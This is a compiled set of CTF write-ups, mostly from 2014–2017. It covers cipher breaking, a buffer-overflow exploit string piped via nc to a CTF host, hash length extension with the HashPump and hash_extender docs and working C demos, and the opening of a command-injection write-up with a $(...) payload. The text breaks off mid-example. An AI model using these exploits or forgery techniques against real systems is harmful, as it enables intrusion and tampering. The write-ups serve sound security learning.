<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-daviddelille
description: CTF writeups and security challenges by DavidDeLille.
---

# Writeups by DavidDeLille

Source repository: `/repos/DavidDeLille`

## Repository Index

- writeups/README.md
- writeups/volgactf_2015/homework/README.md
- writeups/volgactf_2015/relax_&_enjoy/README.md
- writeups/volgactf_2015/world_art/joy200/README.md
- writeups/plaidctf_2015/ebp/README.md
- writeups/plaidctf_2015/qttpd/README.md
- writeups/plaidctf_2015/strength/README.md
- writeups/plaidctf_2015/unknown/README.md
- writeups/picoctf_2014/crudecrypt/README.md
- writeups/picoctf_2014/fancy_cache/README.md
- writeups/picoctf_2014/low_entropy/README.md
- writeups/picoctf_2014/massive_fail/README.md
- writeups/picoctf_2014/netsino/README.md
- writeups/picoctf_2014/rsa_mistakes/README.md
- writeups/picoctf_2014/steves_list/README.md
- writeups/picoctf_2014/steves_list/hlextend-master/README.md
- writeups/pico2017/flagsay1/README.md
- writeups/pico2017/guess-the-number/README.md
- writeups/pico2017/ive-got-a-secret/README.md
- writeups/pico2017/shells/README.md
- writeups/pico2017/shellz/README.md
- writeups/pico2017/sorandom/README.md
- writeups/pico2017/vrgearconsole/README.md
- writeups/nuit_du_hack_quals_2015/clark_kent/README.md
- writeups/nuit_du_hack_quals_2015/gameoflife/README.md
- writeups/confidense_ctf_teaser_2015/mac_hacking/HashPump-master/README.md
- writeups/confidense_ctf_teaser_2015/mac_hacking/hash_extender-master/README.md
- writeups/bctf_2015/checkin/README.md
- writeups/backdoorctf_2015/echo/README.md
- writeups/backdoorctf_2015/rapidfire/README.md
- writeups/asis_ctf_quals_2015/simple_algo/README.md
- writeups/PentesterLab Pro/Essential Badge/AUTHE_01.md
- writeups/PentesterLab Pro/Essential Badge/AUTHE_02.md
- writeups/PentesterLab Pro/Essential Badge/AUTHE_03.md
- writeups/PentesterLab Pro/Essential Badge/AUTHE_04.md
- writeups/PentesterLab Pro/Essential Badge/AUTHO_01.md
- writeups/PentesterLab Pro/Essential Badge/AUTHO_02.md
- writeups/PentesterLab Pro/Essential Badge/AUTHO_03.md
- writeups/PentesterLab Pro/Essential Badge/AUTHO_04.md
- writeups/PentesterLab Pro/Essential Badge/AUTHO_05.md
- writeups/PentesterLab Pro/Essential Badge/AUTHO_06.md
- writeups/PentesterLab Pro/Essential Badge/CODEXEC_01.md
- writeups/0ctf_2015/old_crypto/README.md

## Writeup Content


### File: writeups/0ctf_2015/old_crypto/README.md

We start by trying to understand the function encrypt in oldcrypto.py.
This is how it works:
	repeat key several times
	take plain text character and corresponding key character, and look up in table
	add i**7, then do % 26
	add character to cipher text

This is basically a Vignere cipher with a different table and a twist at the end.

Because the last step is static (+ i**7 % 26), we can transform it back into the letters that came from the table lookup (see reverse_crypto.py). Now all we have is a special case of a Vignere cipher.

The first step in breaking a Vignere cipher, is determining the key length. This is done by trying different key lengths, and calculating the index_of_coincidence for each of the subtexts (which are formed by taking every ith character). Plain text has an i_o_c of about 0.0667 and random text has an i_o_c of about 0.0385. This means we are looking for a key length that brings the i_o_c of each subtext close to 0.0667. Through trial and error, we can see that 20 is our most likely candidate (5 and 10 look obviously interesting too).

Now that we know the key length, we will try to decrypt each subtext separately. For this, we will try each of the 26 decryptions with the given table, and calculate the chi-squared statistic between the letter frequencies of the decryption and the letter frequencies of an English text of the same length. This measure shows us how well the 2 letter frequencies match; the lower this chi-squared value, the better the letter frequencies match. For each key character, we choose the character that gives the lowest chi-squared value.

We now run the entire script to get our approximate key:
$ python reverse_crypto.py 20
ciassicalccphdeioabh

We can already guess that the first part of the word should be "classical".

Now we will try different keys (with try_key.py), in order to fix the errors in the decrypted text.

For example, using key "incryptanaqysagktbpo", gives as first part of the decrypted text "incryptanaqysagktbpo". Here we can guess that the 11th character (q) should be an 'l', in order to form the word "cryptanalysis". The corresponding key character is 'c'. We could try all possible letters until we find the one that produces and 'i' in that spot, or we could look it up in the table.

This is the first part of the cipher text (after undoing the last step with i**7): "fcqkpiemcasvveucwjga" 
The 11th character is 's'. This means tr['c']['s'] = 'q' (replace characters by the integers that represent them).
We need to find the key character, such that tr[...]['s'] = 'l'.
We character we are looking for is 'i', so we update our key: "classicalciphdeioabh"

We continue by guessing the key and looking up key characters in the table, until the entire decrypted text makes sense.

key = "classicalcipherisfun"

This is the decrypted text:
incryptanalysiskasiskiexaminationisamethodofattackingpolyalphabeticsubstitutioncipherssuchasthevigenerecipherinpolyalphabeticsubstitutioncipherswherethesubstitutionalphabetsarechosenbytheuseofakeywordthekasiskiexaminationallowsacryptanalysttodeducethelengthofthekeywordusedinthepolyalphabeticsubstitutioncipheroncethelengthofthekeywordisdiscoveredthecryptanalystlinesuptheciphertextinncolumnswherenisthelengthofthekeywordtheneachcolumncanbetreatedastheciphertextofamonoalphabeticsubstitutioncipherassucheachcolumncanbeattackedwithfrequencyanalysisthekasiskiexaminationinvolveslookingforstringsofcharactersthatarerepeatedintheciphertextthestringsshouldbethreecharacterslongormorefortheexaminationtobesuccessfulthenthedistancesbetweenconsecutiveoccurrencesofthestringsarelikelytobemultiplesofthelengthofthekeywordthusfindingmorerepeatedstringsnarrowsdownthepossiblelengthsofthekeywordsincewecantakethegreatestcommondivisorofallthedistancesthereasonthistestworksisthatifarepeatedstringoccursintheplaintextandthedistancebetweencorrespondingcharactersisamultipleofthekeywordlengththekeywordletterswilllineupinthesamewaywithbothoccurrencesofthestringthedifficultyofusingthekasiskiexaminationliesinfindingrepeatedstringsthisisaveryhardtasktoperformmanuallybutcomputerscanmakeitmucheasierhowevercareisstillrequiredsincesomerepeatedstringsmayjustbecoincidencesothatsomeoftherepeatdistancesaremisleadingthecryptanalysthastoruleoutthecoincidencestofindthecorrectlengththenofcoursethemonoalphabeticciphertextsthatresultmustbecryptanalyzedoooooooooooooooooooopsflagisthekeywithoopsprefixandbraces

Following the instructions at the end, we get our flag: 0ctf{classicalcipherisfun}


### File: writeups/README.md

# CTFs
This repo contains my write-ups for security Capture The Flags, wargames, or similar exercises. The goal is to keep a record for myself, improve my writing nd MarkDown skills, and to allow others to look up the answers if they so choose. If you are the owner of a CTF/wargame and would like me to remove a write-up, please create an issue and I will do so. 

MarkDown code for challenge information:
```markdown
**Challenge name:**       
**Description:**     
**Hint:**       
**File(s) provided:**      
-      
---
```



### File: writeups/asis_ctf_quals_2015/simple_algo/README.md

# Simple algorithm
First, we look the code in simple_algorithm.py and try to understand it. In short, it converts the flag to a hexadeimal number, transforms that to a decimal number and then encrypts 2 digits at a time. There is no key though, so it's really more a type of encoding. Also, for some reason it drops the first letter of the plaintext.

We can reuse the code to try all possible 2-digits numbers and their respective encodings: (see below)

Normally an encoding such as this is easily reversible, but there is one problem: there are multiple ways to split up an encoded string.  
Example: if the encoded string contains "240", it could either be "240" (input 30) or "24 0" (input 06 and 00).

We know the flag format, so we can try the lowest and highest possible flag and see which parts are always the same (after altering the code slightly):
```
root@kali:~/git/writeups/asis_ctf_quals_2015/simple_algo# python simple_algorithm.py
ASIS{00000000000000000000000000000000}
2712733801194321673080924280272919148112712871921790216656907207572172432448111947191682811944216233193618028182875719416452697218
45 [271, 273, 3, 801, 1943, 216, 730, 809, 242, 802, 729, 1914, 811, 271, 28, 719, 217, 90, 216, 656, 90, 720, 757, 217, 243, 244, 811, 1947, 1916, 82, 81, 1944, 216, 233, 1936, 1, 802, 818, 28, 757, 1941, 645, 269, 721, 8]

root@kali:~/git/writeups/asis_ctf_quals_2015/simple_algo# python simple_algorithm.py
ASIS{ffffffffffffffffffffffffffffffff}
2712733801194319166382773275984640195226924665689638729759802658638727373193564919358975664871807801163881123419528192432536511
45 [271, 273, 3, 801, 1943, 1916, 638, 27, 732, 759, 84, 640, 1952, 269, 246, 656, 89, 638, 729, 759, 802, 658, 638, 72, 73, 73, 1935, 649, 1935, 89, 756, 648, 71, 807, 801, 1, 638, 811, 234, 1952, 819, 243, 253, 651, 1]
```
We can see that both lists contain 45 elements and that this sublist is the same: "271, 273, 3, 801, 1943". This will probably also be the case for the string we need to decode.

Now all we need to do is split up the encoded string (`enc.txt`) into 45 elements:
```
271
273
3
801
1943
811
638
801
243
1914
658
649
818
219
215
1917
719
24
82
246
813
640
1914
243
818
809
730
729
243
701
638
801
1943
1936
1945
737
721
732
84
730
273
243
1917
84
28
```
We transform this into a Python list and create a file (`decode.py`) to decode the list:
```
$ pythond decode.py
...
SIS{a9ab115c488a311896dac4e8bc20a6d7}
```

Flag: `ASIS{a9ab115c488a311896dac4e8bc20a6d7}`

#####
# Encoding

```
f(n)    n
----------
0       00
1       01
3       02
8       03
9       04
10      05
24      06
26      07
27      08
28      09
30      10
71      11
72      12
73      13
78      14
80      15
81      16
82      17
84      18
89      19
90      20
91      21
213     22
215     23
216     24
217     25
219     26
233     27
234     28
235     29
240     30
242     31
243     32
244     33
246     34
251     35
252     36
253     37
267     38
269     39
270     40
271     41
273     42
638     43
639     44
640     45
645     46
647     47
648     48
649     49
651     50
656     51
657     52
658     53
699     54
701     55
702     56
703     57
705     58
719     59
720     60
721     61
726     62
728     63
729     64
730     65
732     66
737     67
738     68
739     69
753     70
755     71
756     72
757     73
759     74
800     75
801     76
802     77
807     78
809     79
810     80
811     81
813     82
818     83
819     84
820     85
1914    86
1916    87
1917    88
1918    89
1920    90
1934    91
1935    92
1936    93
1941    94
1943    95
1944    96
1945    97
1947    98
1952    99
```


### File: writeups/backdoorctf_2015/echo/README.md

# Echo
**Description:**  
Little Suzie started learning C. She created a simple program that echo's back whatever you input. Here is the binary file. The vampire came across this service on the internet. `nc hack.bckdr.in 8002`. Reports say he found a flag. See if you can get it.

*****

After connecting to the service, it's easy to determine that we're dealing with a simple buffer overflow.

Disassembling the binary using IDA, we can also find a function (address `0x0804854D`) that will read out the flag file.

All we have to do is overflow the buffer and overwrite the return address with the function's address, in order to get the flag.

Exploit string: `python -c 'print "a"*62 + "\x4d\x85\x04\x08"' | nc hack.bckdr.in 8002`

FLAG: 96f674623c2c378f89700aa46f02cf3b311489f0facdfac6fd5885d4bc1a129a


### File: writeups/backdoorctf_2015/rapidfire/README.md

# Rapidfire
The goal is to write a client that can answer a large number of questions very quickly.
It wasn't really that hard; just a bit annoying to fine-tune. See `client.py`.

How I tackled each type of question:
- Fibonacci ("Give me the sum of first 124 fibonacci numbers"):  
Generate a list of fibonacci numbers and take the sum of that list.
- Movie ("Give me the release year of Wreck-It Ralph"):  
Use `scraper.py` to look up the year on IMDB. Store any new results in a pickled file.
- Country Code ("Give me the 2 digit code of Gabon"):  
Copied a list of country codes into a Python dictionary and manually fixed it if there were errors.
- Sum odd numbers("Next up, what's the sum of first 4889232609 natural odd numbers"):  
Use the formula `n**2`.
- Prime ("Show me the 583622nd prime number"):  
Downloaded a file of the first million primes, transformed it into a pickled list, then load that list before connecting, and do a simple lookup.
- Sum natural numbers ("So tell me the sum of first 9990975934 natural numbers"):  
Use the formula `(n+1)*n/2`.
- Binary("Next up, what's the value of 2044298071 in binary"):  
Use the Python function bin.
- MD5 ("Do you know what's the md5 hash of 1997193813"):  
Use the Python function hashlib.md5(n).hexdigest()
- Country("What is the country of Prague"):  
Similar to Country code, but I downloaded a list of captials.
- Pi ("Show me the 420495th digit in pi"):  
Load a file of pi digits before connecting and then do a simple lookup.

Flag: 1_4m_h4v1n6_50_much_fun_4r3_y0u?


### File: writeups/bctf_2015/checkin/README.md

# Checkin
**Score:** 10  
**Type:** trivial  
**Description:**  
Please checkin at IRC.

-----

When we log into the IRC channel, the topic is:
```
BCTF 2015 has started. Check in flag: OPGS{jr1p0zr-g0-OPGS-2015_t00q-yhpx}. Questions about sqli_engine, please message @zTrix. do NOT send duplicate message to WebChat.
```

Submmitting `OPGS{jr1p0zr-g0-OPGS-2015_t00q-yhpx}` as the flag didn't work. It seems like we need to change this flag somehow.

First thing to note, is "OPGS-2015" and "OPGS" at the start. The About page says all flags start with "BCTF". This seems like a simple, classical cipher.
Let's try ROT13:
```
$ python
>>> s =  "OPGS{jr1p0zr-g0-OPGS-2015_t00q-yhpx}"
>>> s.encode('rot_13')
'BCTF{we1c0me-t0-BCTF-2015_g00d-luck}'
```

Flag: `BCTF{we1c0me-t0-BCTF-2015_g00d-luck}`


### File: writeups/confidense_ctf_teaser_2015/mac_hacking/HashPump-master/README.md

# HashPump

A tool to exploit the hash length extension attack in various hashing algorithms.

Currently supported algorithms: MD5, SHA1, SHA256, SHA512.

## Help Menu

```bash
$ hashpump -h
HashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]
    HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.
    -h --help          Display this message.
    -t --test          Run tests to verify each algorithm is operating properly.
    -s --signature     The signature from known message.
    -d --data          The data from the known message.
    -a --additional    The information you would like to add to the known message.
    -k --keylength     The length in bytes of the key being used to sign the original message with.
    Version 1.1.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.
    <Developed by bwall(@botnet_hunter)>
```

## Sample Output

```bash
$ hashpump -s '6d5f807e23db210bc254a28be2d6759a0f5f5d99' --data 'count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo' -a '&waffle=liege' -k 14
0e41270260895979317fff3898ab85668953aaa2
count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02(&waffle=liege
```

## Compile & install

```bash
$ git clone https://github.com/bwall/HashPump.git
$ apt-get install g++ libssl-dev
$ make
$ make install
```

`apt-get` and `make install` require root privileges to run correctly.  The actual requirement is for `-lcrypto`, so depending on your operating system, your dependencies may vary.

On OS X HashPump can also be installed using [Homebrew](http://brew.sh/):

```bash
$ brew install hashpump
```

## Mentions

HashPump has been mentioned in a few write-ups.  If you are wondering how you can use HashPump, these are some great examples.

* http://ctfcrew.org/writeup/54
* http://d.hatena.ne.jp/kusano_k/20140310/1394471922 (JP)
* http://conceptofproof.wordpress.com/2014/04/13/plaidctf-2014-web-150-mtgox-writeup/
* http://achatz.me/plaid-ctf-mt-pox/
* http://herkules.oulu.fi/thesis/nbnfioulu-201401141005.pdf
* https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/mtpox

## Python Bindings
Fellow Python lovers will be pleased with this addition.  Saving me from writing an implementation of all these hash algorithms with the ability to modify states in Python, Python bindings have been added in the form of hashpumpy.  This addition comes from [zachriggle](https://github.com/zachriggle).

### Installation
These Python bindings are available on [PyPI](https://pypi.python.org/pypi/hashpumpy/1.0) and can be installed via pip.
  pip install hashpumpy
  
### Usage
    >>> import hashpumpy
    >>> help(hashpumpy.hashpump)
    Help on built-in function hashpump in module hashpumpy:
    
    hashpump(...)
        hashpump(hexdigest, original_data, data_to_add, key_length) -> (digest, message)
    
        Arguments:
            hexdigest(str):      Hex-encoded result of hashing key + original_data.
            original_data(str):  Known data used to get the hash result hexdigest.
            data_to_add(str):    Data to append
            key_length(int):     Length of unknown data prepended to the hash
    
        Returns:
            A tuple containing the new hex digest and the new message.
    >>> hashpumpy.hashpump('ffffffff', 'original_data', 'data_to_add', len('KEYKEYKEY'))
    ('e3c4a05f', 'original_datadata_to_add')



### File: writeups/confidense_ctf_teaser_2015/mac_hacking/hash_extender-master/README.md

# Hash Extender by Ron Bowes <ron@skullsecurity.net>

This will be a blog post on http://www.skullsecurity.org/. For now, it's a README file.

## Intro

**You can grab the hash_extender tool on [Github](https://github.com/iagox86/hash_extender)!**

Awhile back, my friend [mogigoma](http://twitter.com/mogigoma) and I were doing a capture-the-flag contest at [https://stripe-ctf.com](https://stripe-ctf.com). One of the levels of the contest required us to perform a hash length extension attack. I had never even heard of the attack at the time, and after some reading I realized that not only is it a super cool (and conceptually easy!) attack to perform, there is also a total lack of good tools for performing said attack!  After hours of adding the wrong number of null bytes or incorrectly adding length values, I vowed to write a tool to make this easy for myself and anybody else who's trying to do it. So, after a couple weeks of work, here it is!

Now I'm gonna release the tool, and hope I didn't totally miss a good tool that does the same thing! It's called `hash_extender`, and implements a length extension attack against every algorithm I could think of:

- MD4
- MD5
- RIPEMD-160
- SHA-0
- SHA-1
- SHA-256
- SHA-512
- WHIRLPOOL

I'm more than happy to extend this to cover other hashing algorithms as well, provided they are "vulnerable" to this attack -- MD2, SHA-224, and SHA-384 are not. Please contact me if you have other candidates and I'll add them ASAP!

## The attack

An application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret.  Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data.

It turns out, even though the attacker doesn't know the value of the prepended secret, he can still generate a valid hash for `{secret || data || attacker_controlled_data}`! This is done by simply picking up where the hashing algorithm left off; it turns out, 100% of the state needed to continue a hash is in the output of most hashing algorithms! We simply load that state into the appropriate hash structure and continue hashing.

**TL;DR: given a hash that is composed of a string with an unknown prefix, an attacker can append to the string and produce a new hash that still has the unknown prefix.**

## Example

Let's look at a step-by-step example. For this example:

- let `secret    = "secret"`
- let `data      = "data"`
- let `H         = md5()`
- let `signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b`
- let `append    = "append"`

The server sends `data` and `signature` to the attacker. The attacker guesses that `H` is MD5 simply by its length (it's the most common 128-bit hashing algorithm), based on the source, or the application's specs, or any way they are able to.

Knowing only `data`, `H`, and `signature`, the attacker's goal is to append `append` to `data` and generate a valid signature for the new data. And that's easy to do! Let's see how.

### Padding

Before we look at the actual attack, we have to talk a little about padding.

When calculating `H`(`secret` + `data`), the string (`secret` + `data`) is padded with a '1' bit and some number of '0' bits, followed by the length of the string. That is, in hex, the padding is a 0x80 byte followed by some number of 0x00 bytes and then the length. The number of 0x00 bytes, the number of bytes reserved for the length, and the way the length is encoded, depends on the particular algorithm and blocksize.

With most algorithms (including MD4, MD5, RIPEMD-160, SHA-0, SHA-1, and SHA-256), the string is padded until its length is congruent to 56 bytes (mod 64). Or, to put it another way, it's padded until the length is 8 bytes less than a full (64-byte) block (the 8 bytes being size of the encoded length field). There are two hashes implemented in hash_extender that don't use these values: SHA-512 uses a 128-byte blocksize and reserves 16 bytes for the length field, and WHIRLPOOL uses a 64-byte blocksize and reserves 32 bytes for the length field.

The endianness of the length field is also important. MD4, MD5, and RIPEMD-160 are little-endian, whereas the SHA family and WHIRLPOOL are big-endian. Trust me, that distinction cost me days of work!

In our example, `length(secret || data) = length("secretdata")` is 10 (0x0a) bytes, or 80 (0x50) bits. So, we have 10 bytes of data (`"secretdata"`), 46 bytes of padding (80 00 00 ...), and an 8-byte little-endian length field (50 00 00 00 00 00 00 00), for a total of 64 bytes (or one block). Put together, it looks like this:

    0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......
    0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......

Breaking down the string, we have:

- `"secret" = secret`
- `"data" = data`
- 80 00 00 ... -- The 46 bytes of padding, starting with 0x80
- 50 00 00 00 00 00 00 00 -- The bit length in little endian

This is the exact data that `H` hashed in the original example.

### The attack

Now that we have the data that `H` hashes, let's look at how to perform the actual attack.

First, let's just append `append` to the string. Easy enough!  Here's what it looks like:

    0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......
    0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......
    0040  61 70 70 65 6e 64                                append

The hash of that block is what we ultimately want to a) calculate, and b) get the server to calculate. The value of that block of data can be calculated in two ways:

- By sticking it in a buffer and performing `H(buffer)`
- By starting at the end of the first block, using the state we already know from `signature`, and hashing `append` starting from that state

The first method is what the server will do, and the second is what the attacker will do. Let's look at the server, first, since it's the easier example.

#### Server's calculation

We know the server will prepend `secret` to the string, so we send it the string minus the `secret` value:

    0000  64 61 74 61 80 00 00 00 00 00 00 00 00 00 00 00  data............
    0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0030  00 00 50 00 00 00 00 00 00 00 61 70 70 65 6e 64  ..P.......append

Don't be fooled by this being exactly 64 bytes (the blocksize) -- that's only happening because `secret` and `append` are the same length. Perhaps I shouldn't have chosen that as an example, but I'm not gonna start over!

The server will prepend `secret` to that string, creating:

    0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......
    0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......
    0040  61 70 70 65 6e 64                                append

And hashes it to the following value:

    6ee582a1669ce442f3719c47430dadee

For those of you playing along at home, you can prove this works by copying and pasting this into a terminal:

    echo '
    #include <stdio.h>;
    #include <openssl/md5.h>;
  
    int main(int argc, const char *argv[])
    {
      MD5_CTX c;
      unsigned char buffer[MD5_DIGEST_LENGTH];
      int i;
  
      MD5_Init(&c);
      MD5_Update(&c, "secret", 6);
      MD5_Update(&c, "data"
                     "\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                     "\x00\x00\x00\x00"
                     "\x50\x00\x00\x00\x00\x00\x00\x00"
                     "append", 64);
      MD5_Final(buffer, &c);
  
      for (i = 0; i < 16; i++) {
        printf("%02x", buffer[i]);
      }
      printf("\n");
      return 0;
    }' > hash_extension_1.c
  
    gcc -o hash_extension_1 hash_extension_1.c -lssl -lcrypto
  
    ./hash_extension_1

All right, so the server is going to be checking the data we send against the signature `6ee582a1669ce442f3719c47430dadee`. Now, as the attacker, we need to figure out how to generate that signature!

#### Client's calculation

So, how do we calculate the hash of the data shown above without actually having access to `secret`?

Well, first, we need to look at what we have to work with: `data`, `append`, `H`, and `H(secret || data)`.

We need to define a new function, `H&prime;`, which uses the same hashing algorithm as `H`, but whose starting state is the final state of `H(secret || data)`, i.e., `signature`. Once we have that, we simply calculate `H&prime;(append)` and the output of that function is our hash. It sounds easy (and is!); have a look at this code:

    echo '
    #include <stdio.h>;
    #include <openssl/md5.h>;
  
    int main(int argc, const char *argv[])
    {
      int i;
      unsigned char buffer[MD5_DIGEST_LENGTH];
      MD5_CTX c;
  
      MD5_Init(&c);
      MD5_Update(&c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 64);
  
      c.A = htonl(0x6036708e); /* <-- This is the hash we already had */
      c.B = htonl(0xba0d11f6);
      c.C = htonl(0xef52ad44);
      c.D = htonl(0xe8b74d5b);
  
      MD5_Update(&c, "append", 6); /* This is the appended data. */
      MD5_Final(buffer, &c);
      for (i = 0; i < 16; i++) {
        printf("%02x", buffer[i]);
      }
      printf("\n");
      return 0;
    }' > hash_extension_2.c
  
    gcc -o hash_extension_2 hash_extension_2.c -lssl -lcrypto
  
    ./hash_extension_2

The the output is, just like before:

    6ee582a1669ce442f3719c47430dadee

So we know the signature is right. The difference is, we didn't use `secret` at all! What's happening!?

Well, we create a `MD5_CTX` structure from scratch, just like normal.  Then we take the MD5 of 64 'A's. We take the MD5 of a full (64-byte) block of 'A's to ensure that any internal values -- other than the state of the hash itself -- are set to what we expect.

Then, after that is done, we replace `c.A`, `c.B`, `c.C`, and `c.D` with the values that were found in `signature`: `6036708eba0d11f6ef52ad44e8b74d5b`. This puts the MD5_CTX structure in the same state as it finished in originally, and means that anything else we hash -- in this case `append` -- will produce the same output as it would have had we hashed it the usual way.

We use `htonl()` on the values before setting the state variables because MD5 -- being little-endian -- outputs its values in little-endian as well.

#### Result

So, now we have this string:

    0000  64 61 74 61 80 00 00 00 00 00 00 00 00 00 00 00  data............
    0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0030  00 00 50 00 00 00 00 00 00 00 61 70 70 65 6e 64  ..P.......append

And this signature for `H(secret || data || append)`:

   6ee582a1669ce442f3719c47430dadee

And we can generate the signature without ever knowing what the secret was!  So, we send the string to the server along with our new signature. The server will prepend the signature, hash it, and come up with the exact same hash we did (victory!).

## The tool

**You can grab the hash_extender tool on [Github](https://github.com/iagox86/hash_extender)!**

This example took me hours to write. Why? Because I made about a thousand mistakes writing the code. Too many NUL bytes, not enough NUL bytes, wrong endianness, wrong algorithm, used bytes instead of bits for the length, and all sorts of other stupid problems. The first time I worked on this type of attack, I spent from 2300h till 0700h trying to get it working, and didn't figure it out till after sleeping (and with Mak's help). And don't even get me started on how long it took to port this attack to MD5. Endianness can die in a fire.

Why is it so difficult? Because this is crypto, and crypto is `immensely` complicated and notoriously difficult to troubleshoot. There are lots of moving parts, lots of side cases to remember, and it's never clear why something is wrong, just that the result isn't right. What a pain!

So, I wrote hash_extender. hash_extender is (I hope) the first free tool that implements this type of attack. It's easy to use and implements this attack for every algorithm I could think of.

Here's an example of its use:

    $ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --format md5
    Type: md5
    Secret length: 6
    New signature: 6ee582a1669ce442f3719c47430dadee
    New string: 64617461800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000617070656e64

If you're unsure about the hash type, you can let it try different types by leaving off the --format argument. I recommend using the --table argument as well if you're trying multiple algorithms:

    $ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --out-data-format html --table
    md4       89df68618821cd4c50dfccd57c79815b data80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000P00000000000000append
    md5       6ee582a1669ce442f3719c47430dadee data80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000P00000000000000append

There are plenty of options for how you format inputs and outputs, including HTML (where you use `%NN` notation), CString (where you use `\xNN` notation, as well as `\r`, `\n`, `\t`, etc.), hex (such as how the hashes were specified above), etc.

By default I tried to choose what I felt were the most reasonable options:

- Input data: raw
- Input hash: hex
- Output data: hex
- Output hash: hex

Here's the help page for reference:

    --------------------------------------------------------------------------------
    HASH EXTENDER
    --------------------------------------------------------------------------------
    
    By Ron Bowes <ron @ skullsecurity.net>
    
    See LICENSE.txt for license information.
    
    Usage: ./hash_extender <--data=<data>|--file=<file>> --signature=<signature> --format=<format> [options]
    
    INPUT OPTIONS
    -d --data=<data>
          The original string that we're going to extend.
    --data-format=<format>
          The format the string is being passed in as. Default: raw.
          Valid formats: raw, hex, html, cstr
    --file=<file>
          As an alternative to specifying a string, this reads the original string
          as a file.
    -s --signature=<sig>
          The original signature.
    --signature-format=<format>
          The format the signature is being passed in as. Default: hex.
          Valid formats: raw, hex, html, cstr
    -a --append=<data>
          The data to append to the string. Default: raw.
    --append-format=<format>
          Valid formats: raw, hex, html, cstr
    -f --format=<all|format> [REQUIRED]
          The hash_type of the signature. This can be given multiple times if you
          want to try multiple signatures. 'all' will base the chosen types off
          the size of the signature and use the hash(es) that make sense.
          Valid types: md4, md5, ripemd160, sha, sha1, sha256, sha512, whirlpool
    -l --secret=<length>
          The length of the secret, if known. Default: 8.
    --secret-min=<min>
    --secret-max=<max>
          Try different secret lengths (both options are required)
    
    OUTPUT OPTIONS
    --table
          Output the string in a table format.
    --out-data-format=<format>
          Output data format.
          Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy
    --out-signature-format=<format>
          Output signature format.
          Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy
    
    OTHER OPTIONS
    -h --help 
          Display the usage (this).
    --test
          Run the test suite.
    -q --quiet
          Only output what's absolutely necessary (the output string and the
          signature)

## Defense

So, as a programmer, how do you solve this? It's actually pretty simple. There are two ways:

- Don't trust a user with encrypted data or signatures, if you can avoid it.
- If you can't avoid it, then use HMAC instead of trying to do it yourself.  HMAC is `designed` for this.

HMAC is the real solution. HMAC is designed for securely hashing data with a secret key.

As usual, use constructs designed for what you're doing rather than doing it yourself. The key to all crypto! [pun intended]

**And finally, you can grab the hash_extender tool on [Github](https://github.com/iagox86/hash_extender)!**



### File: writeups/nuit_du_hack_quals_2015/clark_kent/README.md

sub_80484DD		main



### File: writeups/nuit_du_hack_quals_2015/gameoflife/README.md




### File: writeups/pico2017/flagsay1/README.md

**Challenge name:** Flagsay 1      
**Description:** I heard you like flags, so now you can make your own! Exhilarating! Use flagsay-1! Source. Connect on shell2017.picoctf.com:37742.    
**Hint:** System will run exactly what the program gives it      
**File(s) provided:**      
- flagsay-1 (32-bit ELF)  
- flagsay-1.c (source code)  
---

# Step 0: Recon
Looking at the code, we can see that the program:  
- reads input (lines 53-56)
- adds a null terminator at the first ```\n``` (lines 57-60)
- passes the input to the ```placeInFlag``` function, which puts the input inside the flag ASCII art (line 61)
- adds ```/bin/echo ``` at the start of the output and passes it to system

Really?! Never pass user input to system commands without serious input validation, kids. And use whitelisting if you do.

# Step 1: Confirming command injection
```bash
# ./flagsay-1
$(python -c "print 1+1")
               _                                        
